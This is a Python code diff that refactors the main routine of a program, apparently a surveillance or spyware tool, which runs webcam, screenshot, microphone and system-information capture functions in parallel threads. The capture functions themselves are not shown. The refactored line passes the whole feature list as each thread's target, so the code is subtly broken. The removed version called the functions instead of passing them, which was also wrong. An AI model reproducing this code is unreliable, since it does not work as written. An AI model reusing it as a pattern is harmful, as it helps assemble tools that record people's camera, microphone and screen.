@@ -1,7 +1,7 @@
 import threading
 
 import Features.feature
-from Features import feature
+from Features.feature import WEBCAMERA, SCREENSHOTS, MICROPHONE, SYS_INFO
 
 
 class MainFileException(Exception):
@@ -21,32 +21,26 @@ def main():
     for i in range(5,0,-1):
         print(f"Wait: {i}")
 
-    webcamera = Features.feature.WEBCAMERA
-    screenshots = Features.feature.SCREENSHOTS
-    microphone = Features.feature.MICROPHONE
-    system_information = Features.feature.SYS_INFO
+    # List of features to run
+    features = [
+        WEBCAMERA.webcamera,
+        SCREENSHOTS.screenshots,
+        MICROPHONE.microphone,
+        SYS_INFO.system_information,
+        SYS_INFO.os_version
+    ]
 
     try:
-        # Create threads for each function
-        webcamera_thread = threading.Thread(target=webcamera.webcamera())
-        screenshots_thread = threading.Thread(target=screenshots.screenshots())
-        microphone_thread = threading.Thread(target=microphone.microphone())
-        system_information_thread = threading.Thread(target=system_information.system_information())
-        os_version_thread = threading.Thread(target=system_information.os_version())
+        # Create threads for each selected function
+        threads = [threading.Thread(target=features) for feature in features]
 
         # Start the threads
-        webcamera_thread.start()
-        screenshots_thread.start()
-        microphone_thread.start()
-        system_information_thread.start()
-        os_version_thread.start()
+        for thread in threads:
+            thread.start()
 
         # Wait for all threads to finish
-        webcamera_thread.join()
-        screenshots_thread.join()
-        microphone_thread.join()
-        system_information_thread.join()
-        os_version_thread.join()
+        for thread in threads:
+            thread.join()
 
     except Exception as e:
         raise MainFileException("Main failed to run") from e
